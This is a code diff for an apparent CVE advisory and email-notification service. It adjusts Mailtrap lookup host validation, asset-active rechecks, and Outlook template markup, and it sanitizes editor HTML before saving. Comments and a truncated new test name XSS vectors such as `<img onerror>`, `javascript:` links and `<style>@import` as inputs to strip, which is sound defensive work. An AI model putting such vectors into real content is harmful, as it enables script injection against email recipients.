@@ -1,0 +1,1291 @@
+diff --git a/compose.yaml b/compose.yaml
+index 2a6cbc5..1e23382 100644
+--- a/compose.yaml
++++ b/compose.yaml
+@@ -57,7 +57,7 @@ services:
+       ENCRYPTION_KEY: ${ENCRYPTION_KEY:?Set a base64 32-byte encryption key}
+       ENCRYPTION_KEYS: ${ENCRYPTION_KEYS:-}
+       ML_SIGNING_KEY: ${ML_SIGNING_KEY:-}
+-      EGRESS_ALLOWED_HOSTS: ${EGRESS_ALLOWED_HOSTS-raw.githubusercontent.com,services.nvd.nist.gov,api.osv.dev,services.nvd.nist.gov,www.googleapis.com,www.cisa.gov,cisa.gov,api.first.org,api.github.com,api.vulncheck.com,otx.alienvault.com,send.api.mailtrap.io,sandbox.api.mailtrap.io,api.sendgrid.com,smtp.sendgrid.net,api.postmarkapp.com,smtp.maileroo.com,smtp.lettr.com,api.mailgun.net,api.eu.mailgun.net,in-v3.mailjet.com,api.mailjet.com,smtp.gmail.com,www.bleepingcomputer.com,isc.sans.edu,api.msrc.microsoft.com,www.fortiguard.com,filestore.fortinet.com,www.kb.cert.org,kb.cert.org,thehackernews.com,feeds.feedburner.com,www.securityweek.com,www.rapid7.com,googleprojectzero.blogspot.com,projectzero.google,krebsonsecurity.com,tools.cisco.com,sec.cloudapps.cisco.com,security.paloaltonetworks.com,labs.watchtowr.com,www.talosintelligence.com,blog.talosintelligence.com,www.thezdi.com,www.exploit-db.com,www.debian.org,www.cisecurity.com,cisecurity.com,cisecurity.org,www.cisecurity.org,seclists.org,blog.sucuri.net,www.welivesecurity.com,wordpress.org,www.darkreading.com,blog.google,cloud.google.com,docs.cloud.google.com,workspace.google.com,www.greynoise.io,www.malwarebytes.com,cloudblog.withgoogle.com,www.sophos.com,therecord.media,blog.twitter.com,blog.x.com,github.com,github.blog,www.pentestpartners.com,www.forbes.com,www.theregister.com,api.theregister.com,news.google.com,www.cve.org,cve.org,support.apple.com,helpx.adobe.com,access.redhat.com,security.access.redhat.com,security.redhat.com,usn.ubuntu.com,ubuntu.com,www.crowdstrike.com,crowdstrike.com,securelist.com,www.securelist.com,psirtapi.global.sonicwall.com,psirt.global.sonicwall.com}
++      EGRESS_ALLOWED_HOSTS: ${EGRESS_ALLOWED_HOSTS-raw.githubusercontent.com,services.nvd.nist.gov,api.osv.dev,services.nvd.nist.gov,www.googleapis.com,www.cisa.gov,cisa.gov,api.first.org,api.github.com,api.vulncheck.com,otx.alienvault.com,send.api.mailtrap.io,sandbox.api.mailtrap.io,mailtrap.io,api.sendgrid.com,smtp.sendgrid.net,api.postmarkapp.com,smtp.maileroo.com,smtp.lettr.com,api.mailgun.net,api.eu.mailgun.net,in-v3.mailjet.com,api.mailjet.com,smtp.gmail.com,www.bleepingcomputer.com,isc.sans.edu,api.msrc.microsoft.com,www.fortiguard.com,filestore.fortinet.com,www.kb.cert.org,kb.cert.org,thehackernews.com,feeds.feedburner.com,www.securityweek.com,www.rapid7.com,googleprojectzero.blogspot.com,projectzero.google,krebsonsecurity.com,tools.cisco.com,sec.cloudapps.cisco.com,security.paloaltonetworks.com,labs.watchtowr.com,www.talosintelligence.com,blog.talosintelligence.com,www.thezdi.com,www.exploit-db.com,www.debian.org,www.cisecurity.com,cisecurity.com,cisecurity.org,www.cisecurity.org,seclists.org,blog.sucuri.net,www.welivesecurity.com,wordpress.org,www.darkreading.com,blog.google,cloud.google.com,docs.cloud.google.com,workspace.google.com,www.greynoise.io,www.malwarebytes.com,cloudblog.withgoogle.com,www.sophos.com,therecord.media,blog.twitter.com,blog.x.com,github.com,github.blog,www.pentestpartners.com,www.forbes.com,www.theregister.com,api.theregister.com,news.google.com,www.cve.org,cve.org,support.apple.com,helpx.adobe.com,access.redhat.com,security.access.redhat.com,security.redhat.com,usn.ubuntu.com,ubuntu.com,www.crowdstrike.com,crowdstrike.com,securelist.com,www.securelist.com,psirtapi.global.sonicwall.com,psirt.global.sonicwall.com}
+       # Redirect targets of the feeds above (for example www.cisecurity.com ->
+       # cisecurity.org -> www.cisecurity.org). Each hop is re-validated against
+       # the allowlist, so a target missing here fails the feed.
+diff --git a/server/advisoryRender.ts b/server/advisoryRender.ts
+index 96d4f14..665511b 100644
+--- a/server/advisoryRender.ts
++++ b/server/advisoryRender.ts
+@@ -363,9 +363,9 @@ function enterpriseTemplateValues(
+     cve_count: cves.length,
+     cves,
+     honeywell_actions: [
+-      { title: 'Inventory & Scope:', detail: ' Identify all instances of the listed vendor products in your environment.' },
+-      { title: 'Validate Exposure:', detail: ' Confirm the deployed versions fall within the affected ranges before remediation.' },
+-      { title: 'Apply Remediation:', detail: ' Deploy vendor-supplied updates through your change control process.' },
++      { title: 'Inventory & Scope', detail: ' Identify all instances of the listed vendor products in your environment.' },
++      { title: 'Validate Exposure', detail: ' Confirm the deployed versions fall within the affected ranges before remediation.' },
++      { title: 'Apply Remediation', detail: ' Deploy vendor-supplied updates through your change control process.' },
+     ],
+     contact_team: options.contactTeam || 'Security Operations',
+     // Never the empty string: the shipped template writes this straight into
+diff --git a/server/config.ts b/server/config.ts
+index 6fb3100..074b4ac 100644
+--- a/server/config.ts
++++ b/server/config.ts
+@@ -55,6 +55,7 @@ export const DEFAULT_EGRESS_HOSTS = [
+   // Mail providers
+   'send.api.mailtrap.io',
+   'sandbox.api.mailtrap.io',
++  'mailtrap.io', // message-status lookup host for recovery of ambiguous Mailtrap sends
+   'api.sendgrid.com',
+   'smtp.sendgrid.net',
+   'api.postmarkapp.com',
+diff --git a/server/default-advisory-email-template.html b/server/default-advisory-email-template.html
+index b1d5162..5a6c109 100644
+--- a/server/default-advisory-email-template.html
++++ b/server/default-advisory-email-template.html
+@@ -41,10 +41,15 @@
+   <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f1f5f9" style="width:100%;background-color:#f1f5f9;">
+     <tr>
+       <td align="center" class="gutter" style="padding:20px 12px;">
+-        <!--[if mso]><table role="presentation" width="680" align="center" cellpadding="0" cellspacing="0" border="0"><tr><td><![endif]-->
+-        <table role="presentation" class="shell" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" style="width:100%;max-width:680px;background-color:#ffffff;border:1px solid #dbe3ec;">
++        <!--[if mso]><table role="presentation" width="680" align="center" cellpadding="0" cellspacing="0" border="0"><tr><td width="680"><![endif]-->
++        <table role="presentation" class="shell" width="680" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" style="width: 680px; max-width: 680px; background-color:#ffffff;border:1px solid #dbe3ec;">
+           <tr>
+             <td class="pad" bgcolor="#073b5c" style="padding:22px 28px;background-color:#073b5c;">
++              <!--[if gte mso 9]>
++              <v:rect xmlns:v="urn:schemas-microsoft-com:vml" fill="true" stroke="false" style="width:680px;height:142px;">
++                <v:fill type="gradient" color="#073b5c" color2="#0b5b7f" angle="90"/>
++                <v:textbox inset="0,0,0,0">
++              <![endif]-->
+               <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
+                 <tr><td style="font-size:11px;line-height:16px;font-weight:bold;letter-spacing:1.1px;color:#c7e6f5;">ENTERPRISE VULNERABILITY NOTIFICATION&nbsp; &middot;&nbsp; {{advisory_id}}</td></tr>
+                 <tr><td class="title" style="padding-top:9px;font-size:27px;line-height:34px;font-weight:bold;color:#ffffff;">
+@@ -53,6 +58,10 @@
+                 <tr><td style="padding-top:5px;font-size:17px;line-height:24px;font-weight:bold;color:#ffffff;word-break:break-word;">{{advisory_title}}</td></tr>
+                 <tr><td style="padding-top:7px;font-size:12px;line-height:18px;color:#d5e8f2;">Tracked Records: <strong style="color:#ffffff;">{{cve_count}} CVEs</strong></td></tr>
+               </table>
++              <!--[if gte mso 9]>
++                </v:textbox>
++              </v:rect>
++              <![endif]-->
+             </td>
+           </tr>
+ 
+@@ -72,7 +81,7 @@
+           <tr><td class="pad" style="padding:22px 28px 8px;">
+             <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
+               <tr><td style="font-size:12px;line-height:17px;font-weight:bold;letter-spacing:1px;color:#075985;">01&nbsp; Executive Summary</td></tr>
+-              <tr><td style="padding-top:9px;font-size:14px;line-height:22px;color:#263445;">
++              <tr><td style="padding-top:9px;font-size:14px;line-height:22px;mso-line-height-rule: at-least;color:#263445;">
+                 {{#if executive_summary}}{{{executive_summary}}}{{else}}{{#if is_single_correlation}}1 current inventory correlation.{{else}}{{correlation_count}} current inventory correlations.{{/if}} Top severity: {{top_severity_label}}. Confirm applicability and consult the vendor before remediation.{{/if}}
+               </td></tr>
+             </table>
+@@ -104,10 +113,10 @@
+             <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f8fafc" data-pdf-cve="{{id}}" data-pdf-severity="{{severity}}" style="margin-top:10px;border:1px solid #dbe3ec;background-color:#f8fafc;">
+               <tr><td style="padding:12px 14px 0;font-size:14px;line-height:20px;font-weight:bold;color:#172033;word-break:break-word;">{{id}}&nbsp; &middot;&nbsp; {{vendor}} / {{product}}</td></tr>
+               <tr><td style="padding:5px 14px 0;font-size:12px;line-height:18px;font-weight:bold;">{{#if is_critical}}<span style="color:#b42318;">CRITICAL</span>{{else}}{{#if is_high}}<span style="color:#b54708;">HIGH</span>{{else}}{{#if is_medium}}<span style="color:#8a6500;">MEDIUM</span>{{else}}<span style="color:#16794b;">LOW</span>{{/if}}{{/if}}{{/if}} &middot; {{cvss_score}}</td></tr>
+-              <tr><td style="padding:10px 14px 0;font-size:12px;line-height:18px;color:#344256;"><strong>Description:</strong> {{{description}}}</td></tr>
+-              <tr><td style="padding:8px 14px 0;font-size:12px;line-height:18px;color:#344256;word-break:break-word;"><strong>Affected Versions:</strong> {{affected_versions}} &nbsp;|&nbsp; <a href="{{nvd_url}}" style="color:#075985;text-decoration:underline;">NVD Source &#8599;</a></td></tr>
++              <tr><td style="padding:10px 14px 0;font-size:12px;line-height:18px;mso-line-height-rule: at-least;color:#344256;"><strong>Description:</strong> {{{description}}}</td></tr>
++              <tr><td style="padding:8px 14px 0;font-size:12px;line-height:18px;mso-line-height-rule: at-least;color:#344256;word-break:break-word;"><strong>Affected Versions:</strong> {{affected_versions}} &nbsp;|&nbsp; <a href="{{nvd_url}}" style="color:#075985;text-decoration:underline;">NVD Source &#8599;</a></td></tr>
+               <tr><td style="padding:11px 14px 0;font-size:12px;line-height:18px;font-weight:bold;color:#172033;">Required Actions &amp; Mitigation</td></tr>
+-              <tr><td style="padding:4px 14px 13px;font-size:12px;line-height:19px;color:#344256;">
++              <tr><td style="padding:4px 14px 13px;font-size:12px;line-height:19px;mso-line-height-rule: at-least;color:#344256;">
+                 {{#each mitigations}}<div style="padding-top:4px;">&#8226;&nbsp; {{{this}}}</div>{{/each}}
+               </td></tr>
+             </table>
+diff --git a/server/delivery.ts b/server/delivery.ts
+index 1493db7..d608678 100644
+--- a/server/delivery.ts
++++ b/server/delivery.ts
+@@ -2047,17 +2047,18 @@ export async function deliverNext(
+       const cveIds = [...new Set(findings.map((f) => f.cveId))];
+       // Only inventory that is still active can confirm a finding. A paused,
+       // disabled or deleted asset must not let a queued advisory pass the
+-      // applicability recheck and reach the transport, so inactive rows are
+-      // dropped here and the finding is reported as no longer matching below.
++      // applicability recheck and reach the transport; the finding is reported
++      // as no longer applicable below. Assets are looked up in full so the
++      // revalidation can distinguish a deleted asset from one paused via
++      // `active: false`.
+       const [storedAssets, cveMap, withdrawalMap] = await Promise.all([
+         getMany<WatchListItem>(pool, 'watchlist', assetIds),
+         getMany<NormalizedCVE>(pool, 'cveData', cveIds),
+         getMany<{ modifiedDate: string }>(pool, 'cveWithdrawals', cveIds),
+       ]);
+-      const assetMap = new Map([...storedAssets].filter(([, asset]) => asset.active !== false));
+       for (const id of declaredFindingIds) {
+         const finding = findingMap.get(id);
+-        const asset = finding ? assetMap.get(finding.matchedAssetId) : undefined;
++        const asset = finding ? storedAssets.get(finding.matchedAssetId) : undefined;
+         const cachedCve = finding ? cveMap.get(finding.cveId) : undefined;
+         const withdrawal = finding ? withdrawalMap.get(finding.cveId) : undefined;
+         // Retention may delete the regenerable threat-cache record while a
+@@ -2113,8 +2114,10 @@ export async function deliverNext(
+         const reason = !finding
+           ? 'a finding was removed'
+           : !asset
+-            ? 'the matched inventory item is no longer active'
+-            : ['RESOLVED', 'FALSE_POSITIVE', 'PATCH_APPLIED'].includes(finding.status)
++            ? 'a finding was removed because its matched inventory item was deleted'
++            : asset.active === false
++              ? 'the matched inventory item is no longer active'
++              : ['RESOLVED', 'FALSE_POSITIVE', 'PATCH_APPLIED'].includes(finding.status)
+               ? 'a finding was resolved or dismissed'
+               : cve && withdrawal && Date.parse(cve.modifiedDate) <= Date.parse(withdrawal.modifiedDate)
+                 ? 'a CVE was withdrawn'
+diff --git a/server/emailProviders.ts b/server/emailProviders.ts
+index b9f804d..2136748 100644
+--- a/server/emailProviders.ts
++++ b/server/emailProviders.ts
+@@ -339,10 +339,24 @@ function lookupUrl(provider: EmailConfiguration['provider'], config: EmailConfig
+   if (provider === 'MAILJET_API')
+     return `https://api.mailjet.com/v3/REST/messages/${id}`;
+   if (provider === 'MAILTRAP')
+-    return `https://mailtrap.io/api/v1/inboxes/${encodeURIComponent(config.mailtrapInboxId || '')}/messages/${id}`;
++    return config.mailtrapMode === 'SANDBOX'
++      ? `https://sandbox.api.mailtrap.io/api/inboxes/${encodeURIComponent(config.mailtrapInboxId || '')}/messages/${id}`
++      : `https://mailtrap.io/api/sending_domains/messages/${id}`;
+   return `https://api.postmarkapp.com/messages/outbound/${id}/details`;
+ }
+ 
++/** Fixed send hosts paired with the fixed status endpoints above. */
++function expectedSendHost(provider: EmailConfiguration['provider'], config: EmailConfiguration): string | null {
++  switch (provider) {
++    case 'SENDGRID': return 'api.sendgrid.com';
++    case 'POSTMARK': return 'api.postmarkapp.com';
++    case 'MAILJET_API': return 'api.mailjet.com';
++    case 'MAILTRAP':
++      return config.mailtrapMode === 'SANDBOX' ? 'sandbox.api.mailtrap.io' : 'send.api.mailtrap.io';
++    default: return null;
++  }
++}
++
+ function lookupHeaders(
+   provider: EmailConfiguration['provider'],
+   config: EmailConfiguration,
+@@ -355,8 +369,14 @@ function lookupHeaders(
+       authorization: `Basic ${Buffer.from(`${token}:${config.mailjetApiSecret}`).toString('base64')}`,
+       accept: 'application/json',
+     };
+-  // Mailtrap's v2 API takes a per-inbox API token.
+-  if (provider === 'MAILTRAP') return { 'Api-Token': token, accept: 'application/json' };
++  // Mailtrap authenticates with a bearer credential.
++  if (provider === 'MAILTRAP') {
++    // The stored Mailtrap key is a bare token. Accept a caller-supplied bearer
++    // value, but never emit a non-bearer Authorization scheme: `Api-Token:` is a
++    // JS SDK convenience, not a wire header.
++    const value = /^(?:bearer|token)\s+/i.test(token) ? token : `Bearer ${token}`;
++    return { authorization: value, accept: 'application/json' };
++  }
+   return { authorization: `Bearer ${token}`, accept: 'application/json' };
+ }
+ 
+@@ -420,9 +440,27 @@ export async function lookupProviderDelivery(
+   if (!supportsDeliveryLookup(config.provider) || !messageId) return 'unknown';
+   const url = lookupUrl(config.provider, config, messageId);
+   const endpoint = emailEndpoint(config);
+-  // Defence in depth: a lookup must stay on the host that sends for this
+-  // provider, so a malformed configuration can never point it elsewhere.
+-  if (!endpoint || new URL(endpoint).hostname !== new URL(url).hostname) return 'unknown';
++  // Defence in depth: both URLs are provider-owned fixed endpoints. The
++  // configuration must still point the send endpoint at the host we expect
++  // for the provider, and the lookup must stay on a host that belongs to the
++  // provider. Mailtrap deliberately exposes its status API at mailtrap.io
++  // while it sends through send.api.mailtrap.io or sandbox.api.mailtrap.io,
++  // so requiring lookupHost === sendHost made every Mailtrap lookup return
++  // unknown before any request. Every other provider keeps the strict match.
++  const expectedHost = expectedSendHost(config.provider, config);
++  if (!endpoint || !expectedHost) return 'unknown';
++  let sendHost: string;
++  let lookupHost: string;
++  try {
++    sendHost = new URL(endpoint).hostname;
++    lookupHost = new URL(url).hostname;
++  } catch {
++    return 'unknown';
++  }
++  if (sendHost !== expectedHost) return 'unknown';
++  const allowedLookupHosts =
++    config.provider === 'MAILTRAP' ? new Set([expectedHost, 'mailtrap.io']) : new Set([expectedHost]);
++  if (!allowedLookupHosts.has(lookupHost)) return 'unknown';
+   try {
+     const response = await request(url, {
+       method: 'GET',
+diff --git a/server/pipeline.ts b/server/pipeline.ts
+index d50c36f..5a46f94 100644
+--- a/server/pipeline.ts
++++ b/server/pipeline.ts
+@@ -131,7 +131,7 @@ export async function rebuildLegacyDeliveryPayload(db: pg.Pool | pg.PoolClient,
+       const asset = await get<WatchListItem>(db, 'watchlist', finding.matchedAssetId);
+       const cve = await get<NormalizedCVE>(db, 'cveData', finding.cveId);
+       const withdrawal = await get<{ modifiedDate: string }>(db, 'cveWithdrawals', finding.cveId);
+-      if (!asset?.active || !cve || ['RESOLVED', 'FALSE_POSITIVE', 'PATCH_APPLIED'].includes(finding.status) ||
++      if (!asset || asset.active === false || !cve || ['RESOLVED', 'FALSE_POSITIVE', 'PATCH_APPLIED'].includes(finding.status) ||
+           (withdrawal && Date.parse(cve.modifiedDate) <= Date.parse(withdrawal.modifiedDate))) return false;
+       current.push(finding);
+     }
+@@ -166,7 +166,7 @@ export async function rebuildLegacyDeliveryPayload(db: pg.Pool | pg.PoolClient,
+     const asset = await get<WatchListItem>(db, 'watchlist', finding.matchedAssetId);
+     const cve = await get<NormalizedCVE>(db, 'cveData', finding.cveId);
+     const withdrawal = await get<{ modifiedDate: string }>(db, 'cveWithdrawals', finding.cveId);
+-    if (!asset?.active || !cve || ['RESOLVED', 'FALSE_POSITIVE', 'PATCH_APPLIED'].includes(finding.status) ||
++    if (!asset || asset.active === false || !cve || ['RESOLVED', 'FALSE_POSITIVE', 'PATCH_APPLIED'].includes(finding.status) ||
+         (withdrawal && Date.parse(cve.modifiedDate) <= Date.parse(withdrawal.modifiedDate))) return false;
+     const match = runVulnerabilityPipeline([], [cve], [asset], [], [], { ...DEFAULT_SETTINGS, ...settings, scopeHours: 0 },
+       'Server worker', false, buildAliasMap(aliases, 'VENDOR'), buildAliasMap(aliases, 'PRODUCT'), undefined, aliases).newFindings[0];
+@@ -448,7 +448,7 @@ export async function regroupStaleAdvisory(
+         // the new bundle; a review-held or unverifiable finding stays in place and
+         // is finalized by the caller's FAILED update.
+         const withdrawal = await get<{ modifiedDate: string }>(db, 'cveWithdrawals', finding.cveId);
+-        if (!asset?.active || !cve || ['RESOLVED', 'FALSE_POSITIVE', 'PATCH_APPLIED'].includes(finding.status) ||
++        if (!asset || asset.active === false || !cve || ['RESOLVED', 'FALSE_POSITIVE', 'PATCH_APPLIED'].includes(finding.status) ||
+             (withdrawal && Date.parse(cve.modifiedDate) <= Date.parse(withdrawal.modifiedDate))) {
+           continue;
+         }
+diff --git a/src/components/ActionCenter.tsx b/src/components/ActionCenter.tsx
+index 3de6ca3..ed6d2f6 100644
+--- a/src/components/ActionCenter.tsx
++++ b/src/components/ActionCenter.tsx
+@@ -533,7 +533,18 @@ export const ActionCenter: React.FC = () => {
+ 
+   // HTML Editor Functions
+   const commitVisualBody = useCallback((bodyHtml: string) => {
+-    const updatedHtml = emailDocumentWithBody(htmlContent, bodyHtml);
++    // The editor body is whatever the browser put in the contenteditable: typed
++    // keys, pasted markup, or anything execCommand inserted. That body is saved
++    // as customBodyOverride and is what the recipient receives, so it crosses
++    // the trust boundary here just like the preview does. Reparse it and run it
++    // through the same sanitizer as the preview, never string-patch, so a
++    // `<style>@import`, `javascript:` link or `onerror` handler cannot survive.
++    const parsed = new DOMParser().parseFromString(bodyHtml, 'text/html');
++    const sanitizedBody = new DOMParser().parseFromString(
++      sanitizeEmailHtml(parsed.body.innerHTML),
++      'text/html',
++    ).body.innerHTML;
++    const updatedHtml = emailDocumentWithBody(htmlContent, sanitizedBody);
+     const updatedEdits = { ...edits, customBodyOverride: updatedHtml };
+     setHtmlContent(updatedHtml);
+     setEdits(updatedEdits);
+diff --git a/src/components/AdvisoryTemplateView.tsx b/src/components/AdvisoryTemplateView.tsx
+index fc11e02..6a15156 100644
+--- a/src/components/AdvisoryTemplateView.tsx
++++ b/src/components/AdvisoryTemplateView.tsx
+@@ -396,8 +396,10 @@ const handleInsertToken = (token: string) => {
+               const remediation = finding.cve.remediation;
+               return {
+                 id: finding.cveId,
++                cve_id: finding.cveId,
+                 url: `https://nvd.nist.gov/vuln/detail/${encodeURIComponent(finding.cveId)}`,
+                 nvd_url: `https://nvd.nist.gov/vuln/detail/${encodeURIComponent(finding.cveId)}`,
++                source_url: `https://nvd.nist.gov/vuln/detail/${encodeURIComponent(finding.cveId)}`,
+                 is_critical: severity === 'CRITICAL',
+                 is_high: severity === 'HIGH',
+                 is_medium: severity === 'MEDIUM',
+@@ -415,8 +417,10 @@ const handleInsertToken = (token: string) => {
+             })
+           : previewAdvisory.cveIds.map((id) => ({
+               id,
++              cve_id: id,
+               url: `https://nvd.nist.gov/vuln/detail/${encodeURIComponent(id)}`,
+               nvd_url: `https://nvd.nist.gov/vuln/detail/${encodeURIComponent(id)}`,
++              source_url: `https://nvd.nist.gov/vuln/detail/${encodeURIComponent(id)}`,
+               is_critical: previewAdvisory.severity === 'CRITICAL',
+               is_high: previewAdvisory.severity === 'HIGH',
+               is_medium: previewAdvisory.severity === 'MEDIUM',
+@@ -489,9 +493,11 @@ const handleInsertToken = (token: string) => {
+     const previewSeverityLabel = previewSeverity.charAt(0) + previewSeverity.slice(1).toLowerCase();
+ 
+     let processed = (!hasExistingHeader ? headerBanner + html : html);
+-    processed = renderEmailTemplate(processed, previewValues, { preserveUnknown: true });
+ 
+-    return processed
++    // Resolve tokens the renderer's value map doesn't cover, before the
++    // renderer runs. Any token that still has no value after this is blanked
++    // (matching the server render) instead of leaking as a literal placeholder.
++    processed = processed
+       .replace(/{{severity}}/g, previewSeverity)
+       .replace(/{{severity_text}}/g, previewSeverityLabel)
+       .replace(
+@@ -503,7 +509,17 @@ const handleInsertToken = (token: string) => {
+         `<span style="display:inline-block;padding:4px 10px;border-radius:4px;background:${previewSeverityColor};color:#ffffff;font-size:11px;line-height:16px;font-weight:700;letter-spacing:0.5px;">${previewSeverity}</span>`,
+       )
+       .replace(/{{advisory_id}}/g, previewId)
+-      .replace(/{{advisory_title}}/g, 'Example advisory — template preview only');
++      // Use the current advisory title, as the server preview does. Escaping is
++      // required here because this replacement runs before the template
++      // renderer's normal escaping pass.
++      .replace(
++        /{{advisory_title}}/g,
++        escapeTemplateValue(previewAdvisory?.title || 'Example advisory — template preview only'),
++      );
++
++    processed = renderEmailTemplate(processed, previewValues);
++
++    return processed;
+   };
+ 
+   /**
+diff --git a/src/utils/defaultAdvisoryEmailTemplate.ts b/src/utils/defaultAdvisoryEmailTemplate.ts
+index ea317b1..0bde0ed 100644
+--- a/src/utils/defaultAdvisoryEmailTemplate.ts
++++ b/src/utils/defaultAdvisoryEmailTemplate.ts
+@@ -42,10 +42,15 @@ export const DEFAULT_ADVISORY_EMAIL_TEMPLATE = String.raw`<!doctype html>
+   <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f1f5f9" style="width:100%;background-color:#f1f5f9;">
+     <tr>
+       <td align="center" class="gutter" style="padding:20px 12px;">
+-        <!--[if mso]><table role="presentation" width="680" align="center" cellpadding="0" cellspacing="0" border="0"><tr><td><![endif]-->
+-        <table role="presentation" class="shell" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" style="width:100%;max-width:680px;background-color:#ffffff;border:1px solid #dbe3ec;">
++        <!--[if mso]><table role="presentation" width="680" align="center" cellpadding="0" cellspacing="0" border="0"><tr><td width="680"><![endif]-->
++        <table role="presentation" class="shell" width="680" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" style="width: 680px; max-width: 680px; background-color:#ffffff;border:1px solid #dbe3ec;">
+           <tr>
+             <td class="pad" bgcolor="#073b5c" style="padding:22px 28px;background-color:#073b5c;">
++              <!--[if gte mso 9]>
++              <v:rect xmlns:v="urn:schemas-microsoft-com:vml" fill="true" stroke="false" style="width:680px;height:142px;">
++                <v:fill type="gradient" color="#073b5c" color2="#0b5b7f" angle="90"/>
++                <v:textbox inset="0,0,0,0">
++              <![endif]-->
+               <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
+                 <tr><td style="font-size:11px;line-height:16px;font-weight:bold;letter-spacing:1.1px;color:#c7e6f5;">ENTERPRISE VULNERABILITY NOTIFICATION&nbsp; &middot;&nbsp; {{advisory_id}}</td></tr>
+                 <tr><td class="title" style="padding-top:9px;font-size:27px;line-height:34px;font-weight:bold;color:#ffffff;">
+@@ -54,6 +59,10 @@ export const DEFAULT_ADVISORY_EMAIL_TEMPLATE = String.raw`<!doctype html>
+                 <tr><td style="padding-top:5px;font-size:17px;line-height:24px;font-weight:bold;color:#ffffff;word-break:break-word;">{{advisory_title}}</td></tr>
+                 <tr><td style="padding-top:7px;font-size:12px;line-height:18px;color:#d5e8f2;">Tracked Records: <strong style="color:#ffffff;">{{cve_count}} CVEs</strong></td></tr>
+               </table>
++              <!--[if gte mso 9]>
++                </v:textbox>
++              </v:rect>
++              <![endif]-->
+             </td>
+           </tr>
+ 
+@@ -73,7 +82,7 @@ export const DEFAULT_ADVISORY_EMAIL_TEMPLATE = String.raw`<!doctype html>
+           <tr><td class="pad" style="padding:22px 28px 8px;">
+             <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
+               <tr><td style="font-size:12px;line-height:17px;font-weight:bold;letter-spacing:1px;color:#075985;">01&nbsp; Executive Summary</td></tr>
+-              <tr><td style="padding-top:9px;font-size:14px;line-height:22px;color:#263445;">
++              <tr><td style="padding-top:9px;font-size:14px;line-height:22px;mso-line-height-rule: at-least;color:#263445;">
+                 {{#if executive_summary}}{{{executive_summary}}}{{else}}{{#if is_single_correlation}}1 current inventory correlation.{{else}}{{correlation_count}} current inventory correlations.{{/if}} Top severity: {{top_severity_label}}. Confirm applicability and consult the vendor before remediation.{{/if}}
+               </td></tr>
+             </table>
+@@ -105,10 +114,10 @@ export const DEFAULT_ADVISORY_EMAIL_TEMPLATE = String.raw`<!doctype html>
+             <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f8fafc" data-pdf-cve="{{id}}" data-pdf-severity="{{severity}}" style="margin-top:10px;border:1px solid #dbe3ec;background-color:#f8fafc;">
+               <tr><td style="padding:12px 14px 0;font-size:14px;line-height:20px;font-weight:bold;color:#172033;word-break:break-word;">{{id}}&nbsp; &middot;&nbsp; {{vendor}} / {{product}}</td></tr>
+               <tr><td style="padding:5px 14px 0;font-size:12px;line-height:18px;font-weight:bold;">{{#if is_critical}}<span style="color:#b42318;">CRITICAL</span>{{else}}{{#if is_high}}<span style="color:#b54708;">HIGH</span>{{else}}{{#if is_medium}}<span style="color:#8a6500;">MEDIUM</span>{{else}}<span style="color:#16794b;">LOW</span>{{/if}}{{/if}}{{/if}} &middot; {{cvss_score}}</td></tr>
+-              <tr><td style="padding:10px 14px 0;font-size:12px;line-height:18px;color:#344256;"><strong>Description:</strong> {{{description}}}</td></tr>
+-              <tr><td style="padding:8px 14px 0;font-size:12px;line-height:18px;color:#344256;word-break:break-word;"><strong>Affected Versions:</strong> {{affected_versions}} &nbsp;|&nbsp; <a href="{{nvd_url}}" style="color:#075985;text-decoration:underline;">NVD Source &#8599;</a></td></tr>
++              <tr><td style="padding:10px 14px 0;font-size:12px;line-height:18px;mso-line-height-rule: at-least;color:#344256;"><strong>Description:</strong> {{{description}}}</td></tr>
++              <tr><td style="padding:8px 14px 0;font-size:12px;line-height:18px;mso-line-height-rule: at-least;color:#344256;word-break:break-word;"><strong>Affected Versions:</strong> {{affected_versions}} &nbsp;|&nbsp; <a href="{{nvd_url}}" style="color:#075985;text-decoration:underline;">NVD Source &#8599;</a></td></tr>
+               <tr><td style="padding:11px 14px 0;font-size:12px;line-height:18px;font-weight:bold;color:#172033;">Required Actions &amp; Mitigation</td></tr>
+-              <tr><td style="padding:4px 14px 13px;font-size:12px;line-height:19px;color:#344256;">
++              <tr><td style="padding:4px 14px 13px;font-size:12px;line-height:19px;mso-line-height-rule: at-least;color:#344256;">
+                 {{#each mitigations}}<div style="padding-top:4px;">&#8226;&nbsp; {{{this}}}</div>{{/each}}
+               </td></tr>
+             </table>
+diff --git a/tests/action-center-editor.test.ts b/tests/action-center-editor.test.ts
+new file mode 100644
+index 0000000..86b6fc3
+--- /dev/null
++++ b/tests/action-center-editor.test.ts
+@@ -0,0 +1,166 @@
++import assert from 'node:assert/strict';
++import test from 'node:test';
++import { mkdtemp, rm } from 'node:fs/promises';
++import { join } from 'node:path';
++import { pathToFileURL } from 'node:url';
++import { build } from 'esbuild';
++import { JSDOM } from 'jsdom';
++import React, { act } from 'react';
++
++/**
++ * The Action Center's visual email editor writes into a contenteditable, so
++ * its body is whatever the browser put in the DOM: pasted markup, typed keys,
++ * or the result of an execCommand. That body becomes the saved override and is
++ * what the recipient receives, so the composer has to pass it through the same
++ * sanitizer as the preview. Before the fix the override was written verbatim,
++ * which let a paste of `<img onerror>` or a `javascript:` link reach the mail
++ * transport.
++ *
++ * The edit path is exercised end to end: open a queued delivery, put hostile
++ * markup in the editor, fire the input handler the editor uses, then save and
++ * inspect exactly what was handed to the server.
++ */
++test('the visual email editor sanitizes the body before saving the override', async () => {
++  const dom = new JSDOM('<div id="root"></div>', { url: 'http://localhost' });
++  const globals = globalThis as any;
++  globals.window = dom.window;
++  globals.document = dom.window.document;
++  globals.HTMLElement = dom.window.HTMLElement;
++  globals.DOMParser = dom.window.DOMParser;
++  globals.Node = dom.window.Node;
++  globals.IS_REACT_ACT_ENVIRONMENT = true;
++
